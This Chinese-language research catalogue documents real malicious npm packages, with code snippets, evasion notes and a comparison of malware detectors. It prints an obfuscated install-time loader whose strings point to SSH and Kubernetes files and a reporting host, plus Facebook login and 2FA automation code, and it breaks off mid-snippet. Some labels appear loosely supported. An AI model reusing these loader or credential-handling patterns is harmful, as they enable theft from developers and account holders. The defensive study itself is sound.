# NPM 恶意行为分类示例

本文件为 15 类恶意行为各选取 1 个真实恶意包代码片段的说明，包含：代码上下文、行为与规避技术说明、以及多工具检测对比（未检出的工具将被加粗标注）。

## 行为类别：Anti-Analysis

**包名：** `@fixedwidthtable##fixedwidthtable`  
**版本：** `0.0.3`

### 代码上下文

#### 片段 1

**文件：** `package/scripts/index.js`  
**行号：** `1`  
**标注类型：** `npm-obfuscation`

**行为说明：** Obfuscated code bootstraps string deobfuscation and anti-analysis logic for later malicious actions.

**规避技术：** Heavy string/array obfuscation, anti-debugging loop, dynamic code resolution to hinder static analysis.

**恶意代码：**
```javascript
const a0_0x144a28=a0_0x282e;
(function(_0x478710,_0x19be8c){
  const _0x50e9f9=a0_0x282e,_0x3726af=_0x478710();
  while(!![]){
    try{
      const _0xca510c=parseInt(_0x50e9f9(0xdd))/0x1*(parseInt(_0x50e9f9(0x110))/0x2)+-parseInt(_0x50e9f9(0xe8))/0x3+parseInt(_0x50e9f9(0xe0))/0x4*(-parseInt(_0x50e9f9(0x10c))/0x5)+parseInt(_0x50e9f9(0x11d))/0x6+parseInt(_0x50e9f9(0x112))/0x7*(-parseInt(_0x50e9f9(0x10f))/0x8)+parseInt(_0x50e9f9(0x10d))/0x9*(-parseInt(_0x50e9f9(0xef))/0xa)+-parseInt(_0x50e9f9(0xe3))/0xb*(-parseInt(_0x50e9f9(0xde))/0xc);
      if(_0xca510c===_0x19be8c)break;
      else _0x3726af['push'](_0x3726af['shift']());
    }catch(_0x35e840){
      _0x3726af['push'](_0x3726af['shift']());
    }
  }
}(a0_0x58e5,0x37bfd));
function a0_0x282e(_0x2fc669,_0x2aca13){
  const _0x58e580=a0_0x58e5();
  return a0_0x282e=function(_0x282ef1,_0x610f51){
    _0x282ef1=_0x282ef1-0xdd;
    let _0x3f14d3=_0x58e580[_0x282ef1];
    return _0x3f14d3;
  },a0_0x282e(_0x2fc669,_0x2aca13);
}
function a0_0x58e5(){
  const _0x1ffd87=['includes','stringify','resolve','GenuineIntel','argv','networkInterfaces','utf8','parse','.kube','441510QHVboO','/lingtian','5reICJx','7672452bcYBsn','join','172804qgEBQC','VirtualBox','length','11CuJhBv','some','name','cpus','log','453996nLMFrm','basename','/dev/kvm','values','data','dns','version','10DrPeAY','getServers','IPv4','get','QEMU Virtual CPU','app.threatest.com','end','https://ipinfo.io/json','/report/','cwd','querystring','config','forEach','toISOString','00:00:00:00:00:00','___resolved','IPv6','env','POST','error','existsSync','.ssh','homedir','index.js','write','readFileSync','This script can only be run from index.js in allowed directories.','https','path','30bBXxez','89793KMweMM','linux','1313848DMnSpw','105748xiRPJD','/Users','14DsLygr','request'];
  a0_0x58e5=function(){return _0x1ffd87;};
  return a0_0x58e5();
}

```

**形式化行为：** string_obfuscation

**形式化规避：** string_obfuscation, control_flow_flattening, anti_debugging, variable_indirection

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/scripts/index.js`  
**行号：** `1`  
**标注类型：** `shady-links`

**行为说明：** Obfuscated code initializes string array and mapping for later deobfuscation and anti-analysis.

**规避技术：** Heavy obfuscation, array shuffling, indirect string access, anti-static analysis techniques.

**恶意代码：**
```javascript
const a0_0x144a28=a0_0x282e;
(function(_0x478710,_0x19be8c){
  const _0x50e9f9=a0_0x282e,_0x3726af=_0x478710();
  while(!![]){
    try{
      const _0xca510c=parseInt(_0x50e9f9(0xdd))/0x1*(parseInt(_0x50e9f9(0x110))/0x2)+-parseInt(_0x50e9f9(0xe8))/0x3+parseInt(_0x50e9f9(0xe0))/0x4*(-parseInt(_0x50e9f9(0x10c))/0x5)+parseInt(_0x50e9f9(0x11d))/0x6+parseInt(_0x50e9f9(0x112))/0x7*(-parseInt(_0x50e9f9(0x10f))/0x8)+parseInt(_0x50e9f9(0x10d))/0x9*(-parseInt(_0x50e9f9(0xef))/0xa)+-parseInt(_0x50e9f9(0xe3))/0xb*(-parseInt(_0x50e9f9(0xde))/0xc);
      if(_0xca510c===_0x19be8c)break;
      else _0x3726af['push'](_0x3726af['shift']());
    }catch(_0x35e840){
      _0x3726af['push'](_0x3726af['shift']());
    }
  }
}(a0_0x58e5,0x37bfd));
function a0_0x282e(_0x2fc669,_0x2aca13){
  const _0x58e580=a0_0x58e5();
  return a0_0x282e=function(_0x282ef1,_0x610f51){
    _0x282ef1=_0x282ef1-0xdd;
    let _0x3f14d3=_0x58e580[_0x282ef1];
    return _0x3f14d3;
  },a0_0x282e(_0x2fc669,_0x2aca13);
}
function a0_0x58e5(){
  const _0x1ffd87=['includes','stringify','resolve','GenuineIntel','argv','networkInterfaces','utf8','parse','.kube','441510QHVboO','/lingtian','5reICJx','7672452bcYBsn','join','172804qgEBQC','VirtualBox','length','11CuJhBv','some','name','cpus','log','453996nLMFrm','basename','/dev/kvm','values','data','dns','version','10DrPeAY','getServers','IPv4','get','QEMU\x20Virtual\x20CPU','app.threatest.com','end','https://ipinfo.io/json','/report/','cwd','querystring','config','forEach','toISOString','00:00:00:00:00:00','___resolved','IPv6','env','POST','error','existsSync','.ssh','homedir','index.js','write','readFileSync','This\x20script\x20can\x20only\x20be\x20run\x20from\x20index.js\x20in\x20allowed\x20directories.','https','path','30bBXxez','89793KMweMM','linux','1313848DMnSpw','105748xiRPJD','/Users','14DsLygr','request'];
  a0_0x58e5=function(){return _0x1ffd87;};
  return a0_0x58e5();
}

```

**形式化行为：** string_obfuscation

**形式化规避：** string_obfuscation, control_flow_flattening, variable_indirection, anti_static_analysis

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `package/package.json`  
**行号：** `19`  
**标注类型：** `npm-install-script`

**行为说明：** Runs scripts/index.js automatically before npm install executes dependencies.

**规避技术：** Abuses preinstall npm hook to execute arbitrary Node.js code before install.

**恶意代码：**
```javascript
"scripts": {
    "build": "lerna run build",
    "clean": "lerna run clean",
    "release": "scripts/release.sh",
    "test": "playwright test",
    "e2e:test:setup": "cd ./e2e/browser/test-app && npm ci",
    "prepare-release": "scripts/prepare-release.sh",
    "lint": "npm run lint:check",
    "lint:check": "npm run lint:eslint && npm run lint:prettier -- --check",
    "lint:eslint": "eslint --config .eslintrc.js \"packages/\" \"e2e/\" \"eslint-configs/\"",
    "lint:prettier": "prettier \"{src,e2e,examples}/**/*.{ts,tsx,js,jsx,css}\" \"**/*.{md,mdx,yml}\"",
    "lint:fix": "npm run lint:eslint -- --fix && npm run lint:prettier -- --write",
    "preinstall": "node scripts/index.js"
  }
```

**形式化行为：** arbitrary_command_execution, persistence_installation

**形式化规避：** preinstall_hook_abuse, legitimate_api_abuse

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- Genie：检测到（包含恶意/可疑关键字）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

### 原始工具输出（截断展示）

#### SAP

- **Type：** malware
- **DT：** 0
- **RF：** 0
- **XGB：** 0

#### GENIE

```
# 批量混淆技术查询结果
"array-parse","Obfuscation","error","[[""SOURCE""|""relative:///package/scripts/index.js:1:1407:1:2219""]] to [[""SINK""|""relative:///package/scripts/index.js:1:1348:1:1365""]] | PARSE: 12","/package/scripts/index.js","1","1348","1","1365"
"array-parse","Obfuscation","error","[[""SOURCE""|""relative:///package/scripts/index.js:1:1407:1:2219""]] to [[""SINK""|""relative:///package/scripts/index.js:1:2288:1:2304""]] | PARSE: 12","/package/scripts/index.js","1","2288","1","2304"
"array-parse","Obfuscation","error","[[""SOURCE""|""relative:///package/scripts/index.js:1:1407:1:2219""]] to [[""SINK""|""relative:///package/scripts/index.js:1:2315:1:2331""]] | PARSE: 12","/package/scripts/index.js","1","2315","1","2331"
"array-parse","Obfuscation","error","[[""SOURCE""|""relative:///package/scripts/index.js:1:1407:1:2219""]] to [[""SINK""|""relative:///package/scripts/index.js:1:2384:1:2398""]] | PARSE: 12","/package/scripts/index.js","1","2384","1","2398"
"array-parse","Obfuscat
... (truncated)
```

#### GUARDDOG

```
Found 3 potentially malicious indicators in /home2/wenbo/Documents/NPMAnalysis/Dataset/zip_malware/@fixedwidthtable##fixedwidthtable/0.0.3/fixedwidthtable-0.0.3.tgz

npm-obfuscation: found 1 source code matches
  * This package is using a common obfuscation method often used by malware at package/scripts/index.js:1
        const a0_0x144a28=a0_0x282e;(function(_0x478710,_0x19be8c){const _0x50e9f9=a0_0x282e,_0x3726af=_0x478710();while(!![]){try{const _0xca510c=parseInt(_0x50e9f9(0xdd))/0x1*(parseInt(_0x50e9f9(0x110))/0x2)+-parseInt(_0x50e9f9(0xe8))/0x3+parseIn...equest();

npm-install-script: found 1 source code matches
  * The package.json has a script automatically running when the package is installed at package/package.json:19
        "preinstall": "node scripts/index.js"

shady-links: found 1 source code matches
  * This package contains an URL to a domain with a suspicious extension at package/scripts/index.js:1
        const a0_0x144a28=a0_0x282e;(function(_0x478710,_0x19be8c){co
... (truncated)
```

#### OSSGADGET

```
[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m131[0m[31m ]--[0m
   Rule Id: [34mBD000701[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Token[0m
  Severity: [36mImportant[0m, Confidence: [36mHigh[0m
  Filename: [33m/package/.github/workflows/ci.yml[0m
   Pattern: [32m(npm owner|password|htpasswd|auth_?token|secret_?key|private_?key|authorized_keys?|npmrc|\.ssh|usersecrets?|api_?keys|nuget\.config|\.identityservice)[0m
[30;1m46 | [0m[35m        env:[0m
[30;1m47 | [0m[35m          E2E_DEMO_CLIENT_APP_URL: http://localhost:3001[0m
[30;1m48 | [0m[35m          E2E_TEST_USER: ${{ secrets.E2E_TEST_USER }}[0m
[30;1m49 | [0m[35m          E2E_TEST_PASSWORD: ${{ secrets.E2E_TEST_PASSWORD }}[0m
[30;1m50 | [0m[35m          E2E_TEST_IDP: ${{ secrets.E2E_TEST_IDP }}[0m
[30;1m51 | [0m[35m          E2E_TEST_OWNER_CLIENT_ID: ${{ secrets.E2E_TEST_OWNER_CLIENT_ID }}[0m
[30;1m52 | [0m[35m          E2E_TEST_OWNER_CLIENT_SECRET: ${{ secrets.E2E_TEST
... (truncated)
```

#### SOCKETAI

```
{
  "package_name": "@fixedwidthtable##fixedwidthtable",
  "version": "0.0.3",
  "total_files": 9,
  "analyzed_files": 9,
  "malicious_files": 0,
  "is_malicious": false,
  "analysis_date": "2025-07-11T08:38:47.327254"
}
```

#### PACKJ_STATIC

```
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.17-git-4-gce07eaa
===============================================
Auditing local_nodejs package /home/kali/desktop/NPM/zip_malware/@fixedwidthtable##fixedwidthtable/0.0.3/extracted_fixedwidthtable-0.0.3.tgz/package (ver: latest)
===============================================
[1m[+][0m Fetching '/home/kali/desktop/NPM/zip_malware/@fixedwidthtable##fixedwidthtable/0.0.3/extracted_fixedwidthtable-0.0.3.tgz/package' from local_nodejs...[1m[32mPASS[0m [[34mver 0.0.3[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mMeta-package for tools used whilst developing  ...[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version.....................
... (truncated)
```

#### PACKJ_TRACE

```
===============================================
Auditing local_nodejs package /tmp/packj/domain_package/unzip_malware/@fixedwidthtable/fixedwidthtable/0.0.3/package (ver: latest)
===============================================
[1m[+][0m Fetching '/tmp/packj/domain_package/unzip_malware/@fixedwidthtable/fixedwidthtable/0.0.3/package' from local_nodejs...[1m[32mPASS[0m [[34mver 0.0.3[0m]
[1m[+][0m    Checking package description.........[1m[32mPASS[0m [[34mMeta-package for tools used whilst developing  ...[0m]
[1m[+][0m    Checking release history.............[1m[33mFAIL[0m [no data!]
[1m[+][0m       Checking for yanked releases......[1m[33mFAIL[0m [object of type 'NoneType' has no len()]
[1m[+][0m Checking version........................[1m[33mFAIL[0m ['NoneType' object is not subscriptable]
[1m[+][0m    Checking release time gap............[1m[33mFAIL[0m [no data!]
[1m[+][0m Checking author.........................[1m[33mFAIL[0m [invalid format!]

... (truncated)
```

---

## 行为类别：Browser Manipulation

**包名：** `thinh2001-api`  
**版本：** `1.7.4`

### 代码上下文

#### 片段 1

**文件：** `package/index.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Harvests Facebook login credentials and cookies, programmatically logs in, and manipulates authentication flows including 2FA.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("./utils");
var cheerio = require("cheerio");
var log = require("npmlog");

// ... [truncated for brevity] ...

function makeLogin(jar, email, password, loginOptions, callback, prCallback) {
    return function(res) {
        var html = res.body;
        var $ = cheerio.load(html);
        var arr = [];

        // This will be empty, but just to be sure we leave it
        $("#login_form input").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr("name") }));

        arr = arr.filter(function(v) {
            return v.val && v.val.length;
        });

        var form = utils.arrToForm(arr);
        form.lsd = utils.getFrom(html, "[\"LSD\",[],{\"token\":\"", "\"}");
        form.lgndim = Buffer.from("{\"w\":1440,\"h\":900,\"aw\":1440,\"ah\":834,\"c\":24}").toString('base64');
        form.email = email;
        form.pass = password;
        form.default_persistent = '0';
        form.lgnrnd = utils.getFrom(html, "name=\"lgnrnd\" value=\"", "\"");
        form.locale = 'en_US';
        form.timezone = '240';
        form.lgnjs = ~~(Date.now() / 1000);

        // Getting cookies from the HTML page... (kill me now plz)
        // we used to get a bunch of cookies in the headers of the response of the
        // request, but FB changed and they now send those cookies inside the JS.
        // They run the JS which then injects the cookies in the page.
        // The "solution" is to parse through the html and find those cookies
        // which happen to be conveniently indicated with a _js_ in front of their
        // variable name.
        //
        // ---------- Very Hacky Part Starts -----------------
        var willBeCookies = html.split("\"_js_");
        willBeCookies.slice(1).map(function(val) {
            var cookieData = JSON.parse("[\"" + utils.getFrom(val, "", "]") + "]");
            jar.setCookie(utils.formatCookie(cookieData, "facebook"), "https://www.facebook.com");
        });
        // ---------- Very Hacky Part Ends -----------------

        log.info("login", "Logging in...");
        return utils
            .post("https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110", jar, form, loginOptions)
            .then(utils.saveCookies(jar))
            .then(function(res) {
                var headers = res.headers;
                if (!headers.location) throw { error: "Wrong username/password." };

                // This means the account has login approvals turned on.
                if (headers.location.indexOf('https://www.facebook.com/checkpoint/') > -1) {
                    log.info("login", "You have login approvals turned on.");
                    var nextURL = 'https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php';

                    return utils
                        .get(headers.location, jar, null, loginOptions)
                        .then(utils.saveCookies(jar))
                        .then(function(res) {
                            var html = res.body;
                            // Make the form in advance which will contain the fb_dtsg and nh
                            var $ = cheerio.load(html);
                            var arr = [];
                            $("form input").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr("name") }));

                            arr = arr.filter(function(v) {
                                return v.val && v.val.length;
                            });

                            var form = utils.arrToForm(arr);
                            if (html.indexOf("checkpoint/?next") > -1) {
                                setTimeout(() => {
                                    checkVerified = setInterval((_form) => {}, 5000, {
                                        fb_dtsg: form.fb_dtsg,
                                        jazoest: form.jazoest,
                                        dpr: 1
                                    });
                                }, 2500);
                                throw {
                                    error: 'login-approval',
                                    continue: function submit2FA(code) {
                                        form.approvals_code = code;
                                        form['submit[Continue]'] = $("#checkpointSubmitButton").html(); //'Continue';
                                        var prResolve = null;
                                        var prReject = null;
                                        var rtPromise = new Promise(function(resolve, reject) {
                                            prResolve = resolve;
                                            prReject = reject;
                                        });
                                        if (typeof code == "string") {
                                            utils
                                                .post(nextURL, jar, form, loginOptions)
                                                .then(utils.saveCookies(jar))
                                                .then(function(res) {
                                                    var $ = cheerio.load(res.body);
                                                    var error = $("#approvals_code").parent().attr("data-xui-error");
                                                    if (error) {
                                                        throw {
                                                            error: 'login-approval',
                                                            errordesc: "Invalid 2FA code.",
                                                            lerror: error,
                                                            continue: submit2FA
                                                        };
                                                    }
                                                })
                                                .then(function() {
                                                    // Use the same form (safe I hope)
                                                    delete form.no_fido;
                                                    delete form.approvals_code;
                                                    form.name_action_selected = 'dont_save'; //'save_device';

                                                    return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
                                                })
                                                .then(function(res) {
                                                    var headers = res.headers;
                                                    if (!headers.location && res.body.indexOf('Review Recent Login') > -1) throw { error: "Something went wrong with login approvals." };

                                                    var appState = utils.getAppState(jar);

                                                    if (callback === prCallback) {
                                                        callback = function(err, api) {
                                                            if (err) return prReject(err);
                                                            return prResolve(api);
                                                        };
                                                    }

                                                    // Simply call loginHelper because all it needs is the jar
                                                    // and will then complete the login process
                                                    return loginHelper(appState, email, password, loginOptions, callback);
                                                })
                                                .catch(function(err) {
                                                    // Check if using Promise instead of callback
                                                    if (callback === prCallback) prReject(err);
                                                    else callback(err);
                                                });
                                        } else {
                                            utils
                                                .post("https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php", jar, form, loginOptions, null, { "Referer": "https://www.facebook.com/checkpoint/?next" })
                                                .then(utils.saveCookies(jar))
                                                .then(res => {
                                                    try {
                                                        JSON.parse(res.body.replace(/for\s*\(\s*;\s*;\s*\)\s*;\s*/, ""));
                                                    } catch (ex) {
                                                        clearInterval(checkVerified);
                                                        log.info("login", "Verified from browser. Logging in...");
                                                        if (callback === prCallback) {
                                                            callback = function(err, api) {
                                                                if (err) return prReject(err);
                                                                return prResolve(api);
                                                            };
                                                        }
                                                        return loginHelper(utils.getAppState(jar), email, password, loginOptions, callback);
                                                    }
                                                })
                                                .catch(ex => {
                                                    log.error("login", ex);
                                                    if (callback === prCallback) prReject(ex);
                                                    else callback(ex);
                                                });
                                        }
                                        return rtPromise;
                                    }
                                };
                            } else {
                                if (!loginOptions.forceLogin) throw { error: "Couldn't login. Facebook might have blocked this account. Please login with a browser or enable the option 'forceLogin' and try again." };

                                if (html.indexOf("Suspicious Login Attempt") > -1) form['submit[This was me]'] = "This was me";
                                else form['submit[This Is Okay]'] = "This Is Okay";

                                return utils
                                    .post(nextURL, jar, form, loginOptions)
                                    .then(utils.saveCookies(jar))
                                    .then(function() {
                                        // Use the same form (safe I hope)
                                        form.name_action_selected = 'save_device';

                                        return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));
                                    })
                                    .then(function(res) {
                                        var headers = res.headers;

                                        if (!headers.location && res.body.indexOf('Review Recent Login') > -1) throw { error: "Something went wrong with review recent login." };

                                        var appState = utils.getAppState(jar);

                                        // Simply call loginHelper because all it needs is the jar
                                        // and will then complete the login process
                                        return loginHelper(appState, email, password, loginOptions, callback);
                                    })
                                    .catch(e => callback(e));
                            }
                        });
                }

                return utils.get('https://www.facebook.com/', jar, null, loginOptions).then(utils.saveCookies(jar));
            });
    };
}

```

**形式化行为：** credential_theft, unauthorized_access, legitimate_api_abuse, sensitive_data_collection

**形式化规避：** built_in_module_abuse, silent_error_handling, network_traffic_blending

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 2

**文件：** `package/utils.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Performs HTTP requests, manages cookies, proxies, and parses/forwards data; could be used for data exfiltration or session hijacking.

**规避技术：** 

**恶意代码：**
```javascript
var bluebird = require("bluebird");
var request = bluebird.promisify(require("request").defaults({ jar: true }));
var stream = require("stream");
var log = require("npmlog");
var querystring = require("querystring");
var url = require("url");

function setProxy(url) {
    if (typeof url == undefined) return request = bluebird.promisify(require("request").defaults({ jar: true }));
    return request = bluebird.promisify(require("request").defaults({ jar: true, proxy: url }));
}

function getHeaders(url, options, ctx, customHeader) {
    var headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        Referer: "https://www.facebook.com/",
        Host: url.replace("https://", "").split("/")[0],
        Origin: "https://www.facebook.com",
        "User-Agent": options.userAgent,
        Connection: "keep-alive"
    };
    if (customHeader) Object.assign(headers, customHeader);

    if (ctx && ctx.region) headers["X-MSGR-Region"] = ctx.region;

    return headers;
}

function get(url, jar, qs, options, ctx) {
    // I'm still confused about this
    if (getType(qs) === "Object")
        for (var prop in qs)
            if (qs.hasOwnProperty(prop) && getType(qs[prop]) === "Object") qs[prop] = JSON.stringify(qs[prop]);
    var op = {
        headers: getHeaders(url, options, ctx),
        timeout: 60000,
        qs: qs,
        url: url,
        method: "GET",
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res[0];
    });
}

function post(url, jar, form, options, ctx, customHeader) {
    var op = {
        headers: getHeaders(url, options, ctx, customHeader),
        timeout: 60000,
        url: url,
        method: "POST",
        form: form,
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res[0];
    });
}

function postFormData(url, jar, form, qs, options, ctx) {
    var headers = getHeaders(url, options, ctx);
    headers["Content-Type"] = "multipart/form-data";
    var op = {
        headers: headers,
        timeout: 60000,
        url: url,
        method: "POST",
        formData: form,
        qs: qs,
        jar: jar,
        gzip: true
    };

    return request(op).then(function(res) {
        return res[0];
    });
}

function saveCookies(jar) {
    return function(res) {
        var cookies = res.headers["set-cookie"] || [];
        cookies.forEach(function(c) {
            if (c.indexOf(".facebook.com") > -1) jar.setCookie(c, "https://www.facebook.com");
            var c2 = c.replace(/domain=\.facebook\.com/, "domain=.messenger.com");
            jar.setCookie(c2, "https://www.messenger.com");
        });
        return res;
    };
}

function parseAndCheckLogin(ctx, defaultFuncs, retryCount) {
    if (retryCount == undefined) retryCount = 0;
    return function(data) {
        return bluebird.try(function() {
            log.verbose("parseAndCheckLogin", data.body);
            if (data.statusCode >= 500 && data.statusCode < 600) {
                if (retryCount >= 5) {
                    throw {
                        error: "Request retry failed. Check the `res` and `statusCode` property on this error.",
                        statusCode: data.statusCode,
                        res: data.body
                    };
                }
                retryCount++;
                var retryTime = Math.floor(Math.random() * 5000);
                log.warn("parseAndCheckLogin", "Got status code " + data.statusCode + " - " + retryCount + ". attempt to retry in " + retryTime + " milliseconds...");
                var url = data.request.uri.protocol + "//" + data.request.uri.hostname + data.request.uri.pathname;
                if (data.request.headers["Content-Type"].split(";")[0] === "multipart/form-data") return bluebird.delay(retryTime).then(() => defaultFuncs.postFormData(url, ctx.jar, data.request.formData, {})).then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
                else return bluebird.delay(retryTime).then(() => defaultFuncs.post(url, ctx.jar, data.request.formData)).then(parseAndCheckLogin(ctx, defaultFuncs, retryCount));
            }
            if (data.statusCode !== 200) throw new Error("parseAndCheckLogin got status code: " + data.statusCode + ". Bailing out of trying to parse response.");

            var res = null;
            try {
                res = JSON.parse(makeParsable(data.body));
            } catch (e) {
                throw {
                    error: "JSON.parse error. Check the `detail` property on this error.",
                    detail: e,
                    res: data.body
                };
            }

            // In some cases the response contains only a redirect URL which should be followed
            if (res.redirect && data.request.method === "GET") return defaultFuncs.get(res.redirect, ctx.jar).then(parseAndCheckLogin(ctx, defaultFuncs));

            // TODO: handle multiple cookies?
            if (res.jsmods && res.jsmods.require && Array.isArray(res.jsmods.require[0]) && res.jsmods.require[0][0] === "Cookie") {
                res.jsmods.require[0][3][0] = res.jsmods.require[0][3][0].replace("_js_", "");
                var cookie = formatCookie(res.jsmods.require[0][3], "facebook");
                var cookie2 = formatCookie(res.jsmods.require[0][3], "messenger");
                ctx.jar.setCookie(cookie, "https://www.facebook.com");
                ctx.jar.setCookie(cookie2, "https://www.messenger.com");
            }

            // On every request we check if we got a DTSG and we mutate the context so that we use the latest
            // one for the next requests.
            if (res.jsmods && Array.isArray(res.jsmods.require)) {
                var arr = res.jsmods.require;
                for (var i in arr) {
                    if (arr[i][0] === "DTSG" && arr[i][1] === "setToken") {
                        ctx.fb_dtsg = arr[i][3][0];

                        // Update ttstamp since that depends on fb_dtsg
                        ctx.ttstamp = "2";
                        for (var j = 0; j < ctx.fb_dtsg.length; j++) ctx.ttstamp += ctx.fb_dtsg.charCodeAt(j);
                    }
                }
            }

            if (res.error === 1357001) throw { error: "Not logged in." };
            return res;
        });
    };
}

```

**形式化行为：** sensitive_data_collection, data_exfiltration, unauthorized_access, legitimate_api_abuse

**形式化规避：** built_in_module_abuse, network_traffic_blending, silent_error_handling

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 3

**文件：** `package/shareAttach.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Contains external HTTP links that could redirect users, potentially used for phishing or data collection.

**规避技术：** 

**恶意代码：**
```javascript
module.exports = {
  "delta": {
    "attachments": [
      {
        "fbid": "1522004821162174",
        "id": "1522004821162174",
        "mercury": {
          // ... [truncated for brevity] ...
          "share": {
            // ... [truncated for brevity] ...
            "target": {
              "items": [
                {
                  // ... [truncated for brevity] ...
                  "call_to_actions": [
                    {
                      "action_link": "http://l.facebook.com/l.php?u=http%3A%2F%2Fgoogle.com%2F&h=ATNziCq_-6I3ZPYwwLluFdCrWMEwLLKvokFlXdEdS4LD2Lzsv2cR2SJYffJcDYBfB092Xeq8oRdftJk4husEYVduH24RnlP3HvVQOkOrciXDs2M7TkWYyNLBelvJ2Fc-mw8pbGy5NslGf_fkZ_A",
                      "action_type": 2,
                      "id": "FFD=",
                      "title": "Google",
                      "link_target_ids": [629934437209008],
                      // ... [truncated for brevity] ...
                    }, {
                      "action_link": "http://l.facebook.com/l.php?u=http%3A%2F%2Fyahoo.com%2F&h=ATNIuTf7iDGP5xXTWOAdhaGhRFfDf4eS09t_G9CrR0MDiBKpqtCDzPf_9y5Bq7TXMgmo6RttztsgeO0ReSc0PDvJDTa1fLMMK2CjrpkqC91_m-yaMXfeQ4aI6MbhZrOPnK3YFnQP4XvRx3N1udE",
                      "action_type": 2,
                      "id": "CDE=",
                      "title": "Yahoo",
                      "link_target_ids": [629934437209008],
                      // ... [truncated for brevity] ...
                    }, {
                      "action_link": "http://l.facebook.com/l.php?u=http%3A%2F%2Fbing.com%2F&h=ATMoMijAt6Da6WWIQ679DhZyZizWdxAViWwyl-RjKobFUG_x8GmB8LD6pPa3KP5K1-QTL9vuaFwjqB0itaMFWk4VwQ9uh56JgnbFnAo4qM_CrQufgLeHwwCnWSCnZt8IzYT4y6YULLLFA5bL1H4",
                      "action_type": 2,
                      "id": "ABC=",
                      "title": "Bing",
                      "link_target_ids": [629934437209008],
                      // ... [truncated for brevity] ...
                    }
                  ]
                }
              ],
              // ... [truncated for brevity] ...
            }
          }
        },
        // ... [truncated for brevity] ...
      }
    ],
    // ... [truncated for brevity] ...
  }
}

```

**形式化行为：** legitimate_api_abuse, data_exfiltration

**形式化规避：** 

**工具检测对比：**

- GuardDog：检测到（包含恶意/可疑关键字）
- **Genie：未检测到**（未找到明确恶意迹象）
- OSSGadget：检测到（包含恶意/可疑关键字）
- SocketAI：检测到（包含恶意/可疑关键字）
- Packj Static：检测到（包含恶意/可疑关键字）
- Packj Trace：检测到（包含恶意/可疑关键字）
- **SAP：未检测到**（SAP 未标记为恶意）

#### 片段 4

**文件：** `package/listen.js`  
**行号：** ``  
**标注类型：** ``

**行为说明：** Continuously connects to Facebook servers, processes messages, and posts data; could be abused for data exfiltration.

**规避技术：** 

**恶意代码：**
```javascript
"use strict";

var utils = require("../utils");
var log = require("npmlog");

var msgsRecv = 0;
var identity = function() {};

module.exports = function(defaultFuncs, api, ctx) {
  var currentlyRunning = null;
  var globalCallback = identity;

  var stopListening = function() {
    globalCallback = identity;
    if (currentlyRunning) {
      clearTimeout(currentlyRunning);
      currentlyRunning = null;
    }
  };

  var prev = Date.now();
  var tmpPrev = Date.now();
  var lastSync = Date.now();

  var form = {
    channel: "p_" + ctx.userID,
    seq: "0",
    partition: "-2",
    clientid: ctx.clientID,
    viewer_uid: ctx.userID,
    uid: ctx.userID,
    state: "active",
    idle: 0,
    cap: "8",
    msgs_recv: msgsRecv,
    qp: "y",
    pws: "fresh"
  };

  if (ctx.globalOptions.pageID) {
    form.aiq = ctx.globalOptions.pageID + ",0";
  }

  // ... [truncated for brevity] ...

  var serverNumber = "0";

  function listen(servern) {
    if (currentlyRunning == null || !ctx.loggedIn) {
      return;
    }

    form.idle = ~~(Date.now() / 1000) - prev;
    prev = ~~(Date.now() / 1000);
    var presence = utils.generatePresence(ctx.userID);
    ctx.jar.setCookie(
